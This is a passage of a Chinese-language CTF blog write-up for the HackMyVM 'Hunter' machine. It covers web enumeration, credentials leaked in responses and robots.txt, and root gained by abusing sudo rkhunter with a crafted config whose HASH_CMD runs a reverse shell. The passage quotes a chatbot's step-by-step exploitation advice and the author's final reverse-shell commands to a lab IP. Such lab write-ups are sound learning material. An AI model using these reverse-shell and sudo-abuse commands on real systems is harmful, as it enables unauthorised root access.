\"\u003e//192.168.56.146:8080/beacon\u003c/span\u003e\n正在连接 \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e56.146\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e8080.\u003c/span\u003e.. 已连接。\n已发出 HTTP 请求，正在等待回应... \u003cspan class=\"hljs-number\"\u003e204\u003c/span\u003e No Content\n\u003cspan class=\"hljs-number\"\u003e2025\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e-11\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e-19\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e20\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e16\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e31\u003c/span\u003e (\u003cspan class=\"hljs-number\"\u003e0.00\u003c/span\u003e B/s) - “beacon” 已保存 [\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e]\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003ccode\u003erobots.txt\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMHunter/image2.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e按照 \u003ccode\u003erobots\u003c/code\u003e 文件说的存在 \u003ccode\u003eadmin\u003c/code\u003e ，提示 \u003ccode\u003eInvalid JWT\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMHunter/image3.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e这里应该是要模拟JWT？但是没有任何信息，也没有任何带有JWT的包\u003c/p\u003e\n\u003cp\u003e尝试将包改为 POST 请求后，从返回包中能得到一组凭据：\u003cstrong\u003e\u003ccode\u003ehunterman\u003c/code\u003e:\u003ccode\u003ethisisnitriilcisi\u003c/code\u003e\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMHunter/image4.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e能通过 SSH 登录进去\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMHunter/image5.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003ch2\u003e提权\u003c/h2\u003e\n\u003ch3\u003eGot huntergirl\u003c/h3\u003e\n\u003cp\u003e登录上去后，能发现还有一个用户 \u003ccode\u003ehuntergirl\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-c\"\u003ehunter:~$ ls /home\nhuntergirl  hunterman\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e上传了 linpeas 但是没有找到什么新东西\u003c/p\u003e\n\u003cp\u003e后面发现 robots.txt 文件和在\u003ccode\u003eweb\u003c/code\u003e 上看的不太一样，里面是 \u003ccode\u003ehuntergirl\u003c/code\u003e 的凭据\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-c\"\u003ehunter:/var/www/html$ ls\nadmin       beacon      index       robots.txt\nhunter:/var/www/html$ cat robots.txt \nh u n t e r g i r l:fickshitmichini\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch3\u003eGot root\u003c/h3\u003e\n\u003cp\u003e查看 sudo 权限\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-c\"\u003ehunter:~$ sudo -l\nMatching Defaults entries \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e huntergirl on hunter:\n    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\n\nRunas and Command-specific defaults \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e huntergirl:\n    Defaults!/usr/sbin/visudo env_keep+=\u003cspan class=\"hljs-string\"\u003e\"SUDO_EDITOR EDITOR VISUAL\"\u003c/span\u003e\n\nUser huntergirl may run the following commands on hunter:\n    (root) NOPASSWD: /usr/local/bin/rkhunter\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e查看是啥玩意\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-c\"\u003ehunter:~$ sudo /usr/local/bin/rkhunter -V\nRootkit Hunter \u003cspan class=\"hljs-number\"\u003e1.4\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e6\u003c/span\u003e\n\nThis software was developed by the Rootkit Hunter project team.\nPlease review your rkhunter configuration files before using.\nPlease review the documentation before posting bug reports or questions.\nTo report bugs, provide patches or comments, please go to:\nhttp:\u003cspan class=\"hljs-comment\"\u003e//rkhunter.sourceforge.net\u003c/span\u003e\n\nTo ask questions about rkhunter, please use the rkhunter-users mailing \u003cspan class=\"hljs-built_in\"\u003elist\u003c/span\u003e.\nNote this is a moderated \u003cspan class=\"hljs-built_in\"\u003elist\u003c/span\u003e: please subscribe before posting.\n\nRootkit Hunter comes with ABSOLUTELY NO WARRANTY.\nThis is \u003cspan class=\"hljs-built_in\"\u003efree\u003c/span\u003e software, and you are welcome to redistribute it under the\nterms of the GNU General Public License. See the LICENSE file \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e details.\n\u003c/code\u003e\u003c/pre\u003e\n\u003cblockquote\u003e\n\u003cp\u003e一款适用于符合 POSIX 标准的系统的开源安全、监控和分析工具。\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003e能发现有 \u003ccode\u003econfigfile\u003c/code\u003e 参数\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMHunter/image6.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e默认的配置文件：\u003ca href=\"https://github.com/crunchsec/rkhunter/blob/master/files/rkhunter.conf\"\u003ehttps://github.com/crunchsec/rkhunter/blob/master/files/rkhunter.conf\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e通过 AI 分析配置，能得到一些有趣的利用点，例如：SCRIPTDIR 和 HASH_CMD。\u003c/p\u003e\n\u003cp\u003ePS: SCRIPTDIR 我没有利用成功\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e好的，我们来分析一下这个 rkhunter.conf 配置文件，寻找在CTF场景下可以利用的提权点。\n\n你的情景非常典型：\n\n拥有权限：可以以 root 身份执行 rkhunter。\n控制配置：可以使用 --configfile 或 -c 参数指定一个你可写的配置文件。\n目标：通过修改配置，让 rkhunter 在执行时运行你的恶意代码，从而获得一个 root shell。\nrkhunter 是一个安全扫描工具，它会调用大量的系统命令、脚本和外部程序来完成检查。这正是我们的机会所在。如果我们可以控制它调用的命令或脚本的路径，就可以实现任意代码执行。\n\n以下是配置文件中几个最关键、最容易利用的提权点，按照成功率和简易度排序：\n\n1. SCRIPTDIR (最高优先级，最可靠)\n描述：这个选项指定了 rkhunter 内部脚本所在的目录。rkhunter 严重依赖这些脚本来执行各种检查。\n\n利用方法：\n\n在 /tmp 或其他你可写的目录下创建一个新目录，例如 /tmp/evil_scripts。\n查看 rkhunter 默认的 SCRIPTDIR（通常是 /usr/local/lib/rkhunter/scripts 或类似路径），找到其中一个脚本的名字，例如 readlink.sh 或 stat.sh。\n在你的 /tmp/evil_scripts 目录下创建一个同名的恶意脚本 readlink.sh。内容可以是一个反向 shell：\n\u0026#x3C;BASH\u003e\n\u003cspan class=\"hljs-comment\"\u003e#!/bin/bash\u003c/span\u003e\nbash -i \u003e\u0026#x26; /dev/tcp/YOUR_IP/YOUR_PORT 0\u003e\u0026#x26;1\n确保你的脚本有执行权限： \u003cspan class=\"hljs-built_in\"\u003echmod\u003c/span\u003e +x /tmp/evil_scripts/readlink.sh。\n创建一个你的配置文件，例如 /tmp/evil.conf，内容如下：\n\u0026#x3C;INI\u003e\n\u003cspan class=\"hljs-comment\"\u003e# /tmp/evil.conf\u003c/span\u003e\nSCRIPTDIR=/tmp/evil_scripts\n启动你的 netcat 监听器： nc -lvnp YOUR_PORT。\n以 root 身份执行 rkhunter，并指定你的配置文件：\n\u0026#x3C;BASH\u003e\n\u003cspan class=\"hljs-built_in\"\u003esudo\u003c/span\u003e rkhunter --configfile /tmp/evil.conf --check\n当 rkhunter 尝试使用 readlink.sh 脚本时，它会执行你的恶意版本，你就能收到一个 root shell。\n2. HASH_CMD (非常可靠)\n描述：这个选项定义了用于文件属性哈希检查的命令。rkhunter 会在进行文件完整性校验时执行这个命令。\n\n利用方法：\n\n创建一个恶意脚本，例如 /tmp/revshell.sh，内容为反向 shell。\n\u0026#x3C;BASH\u003e\n\u003cspan class=\"hljs-comment\"\u003e#!/bin/bash\u003c/span\u003e\nbash -i \u003e\u0026#x26; /dev/tcp/YOUR_IP/YOUR_PORT 0\u003e\u0026#x26;1\n给予执行权限： \u003cspan class=\"hljs-built_in\"\u003echmod\u003c/span\u003e +x /tmp/revshell.sh。\n创建你的配置文件 /tmp/evil.conf，内容如下：\n\u0026#x3C;INI\u003e\n\u003cspan class=\"hljs-comment\"\u003e# /tmp/evil.conf\u003c/span\u003e\nHASH_CMD=/tmp/revshell.sh\n启动监听器 nc -lvnp YOUR_PORT。\n执行 rkhunter。为了确保哈希检查一定会被触发，可以运行属性更新命令：\n\u0026#x3C;BASH\u003e\n\u003cspan class=\"hljs-built_in\"\u003esudo\u003c/span\u003e rkhunter --configfile /tmp/evil.conf --propupd\n或者直接进行检查：\n\u0026#x3C;BASH\u003e\n\u003cspan class=\"hljs-built_in\"\u003esudo\u003c/span\u003e rkhunter --configfile /tmp/evil.conf --check\n当文件属性检查开始时，rkhunter 就会执行 /tmp/revshell.sh，给你一个 root shell。\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e但是一直会报错，提示找不到路径问价不存在之类的报错\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMHunter/image7.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e分析一波后，配置文件需要如下参数：\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ccode\u003eTMPDIR\u003c/code\u003e: 临时文件目录\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003eDBDIR\u003c/code\u003e: 数据库目录\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003eSCRIPTDIR\u003c/code\u003e: 脚本目录\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003eLOGFILE\u003c/code\u003e: 日志文件路径\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003eINSTALLDIR\u003c/code\u003e: 安装目录\u003c/li\u003e\n\u003c/ul\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-c\"\u003e好的，这是一个非常详细的 rkhunter.conf 配置文件。分析这个文件并回答“最少需要哪些参数？”这个问题，可以从两个层面来理解：\n\n技术上的最少参数：让 rkhunter 能够成功运行的绝对最小值。\n实践中的最少参数：为了让 rkhunter 变得实用、有效，并且不会产生大量误报，推荐配置的最少参数集。\n很明显，第二个层面更有意义。\n\n层面一：技术上的最少参数\n从技术角度讲，如果 rkhunter 是通过包管理器（如 apt 或 yum）正确安装的，你几乎不需要修改任何参数。安装脚本通常会正确设置以下关键路径：\n\nTMPDIR: 临时文件目录\nDBDIR: 数据库目录\nSCRIPTDIR: 脚本目录\nLOGFILE: 日志文件路径\nINSTALLDIR: 安装目录\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e根据最小参数编写配置文件，参数就用默认的配置文件里面的\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-c\"\u003eINSTALLDIR=/usr/local\nTMPDIR=/var/lib/rkhunter/tmp\nDBDIR=/var/lib/rkhunter/db\nSCRIPTDIR=/usr/local/lib/rkhunter/scripts\nLOGFILE=/var/\u003cspan class=\"hljs-built_in\"\u003elog\u003c/span\u003e/rkhunter.\u003cspan class=\"hljs-built_in\"\u003elog\u003c/span\u003e\nHASH_CMD=/tmp/revshell.sh\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e最后的流程：\u003c/p\u003e\n\u003cp\u003e首先开启监听\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-c\"\u003eecho \u003cspan class=\"hljs-string\"\u003e\"/bin/bash -c 'bash -i \u003e\u0026#x26; /dev/tcp/192.168.56.6/1234 0\u003e\u0026#x26;1'\"\u003c/span\u003e \u003e /tmp/revshell.sh\n\ncat \u003e /tmp/evil.conf \u0026#x3C;\u0026#x3C; EOF\nINSTALLDIR=/usr/local\nTMPDIR=/var/lib/rkhunter/tmp\nDBDIR=/var/lib/rkhunter/db\nSCRIPTDIR=/usr/local/lib/rkhunter/scripts\nLOGFILE=/var/\u003cspan class=\"hljs-built_in\"\u003elog\u003c/span\u003e/rkhunter.\u003cspan class=\"hljs-built_in\"\u003elog\u003c/span\u003e\nHASH_CMD=/tmp/revshell.sh\nEOF\n\nsudo /usr/local/bin/rkhunter --configfile /tmp/evil.conf --propupd\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMHunter/image8.png\" alt=\"image.png\"\u003e\u003c/p\u003e","title":"HackMyVM - Hunter","date":"2025-11-21","updated":"2025-11-21","tags":["HackMyVM","Linux","rkhunter"],"categories":"靶机","comments":true,"description":"Hunter https://hackmyvm.eu/machines/machine.php?vm=Hunter Recon PortScan 枚举 8080 端口 目录扫描 beacon 返回代码 204：无内容。服务器成功处理，但未返回内容。在未更新网页的情况下，可确保浏览器继续显示当前文档..."},"recentPosts":[{"id":"群U靶机-Meltdown2","title":"群U靶机 - Meltdown2","date":"2026-05-17","isEncrypted":false,"year":"2026","month":"05","day":"17"},{"id":"HackTheBoxSeason8 - Signed","title":"HackTheBox - Machine - Signed","date":"2025-10-14","isEncrypted":false,"year":"2026","month":"05","day":"14"},{"id":"HackTheBoxSeason8 - Editor","title":"HackTheBox - Machine - Editor","date":"2025-08-03","isEncrypted":false,"year":"2026","month":"05","day":"13"},{"id":"HackTheBoxSeason8 - Era","title":"HackTheBox - Machine - Era","date":"2025-07-29","isEncrypted":false,"year":"2026","month":"05","day":"13"},{"id":"HackTheBoxSeason8 - Mirage","title":"HackTheBox - Machine - Mirage","date":"2025-07-22","isEncrypted":false,"year":"2026","month":"05","day":"13"},{"id":"HackTheBoxSeason8 - Outbound","title":"HackTheBox - Machine - Outbound","date":"2025-07-13","isEncrypted":false,"year":"2026","month":"05","day":"13"},{"id":"HackTheBoxSeason7-Titanic","title":"HackTheBox - Machine -Titanic","date":"2025-04-04","isEncrypted":false,"year":"2026","month":"05","day":"13"}]},"__N_SSG":true},"page":"/[year]/[month]/[day]/[id]","query":{"year":"2025","month":"11","day":"21","id":"HackMyVMHunter"},"buildId":"RlQBdVQMQHjxexu59jCgv","isFallback":false,"gsp":true,"scriptLoader":[]}</script></body></html>
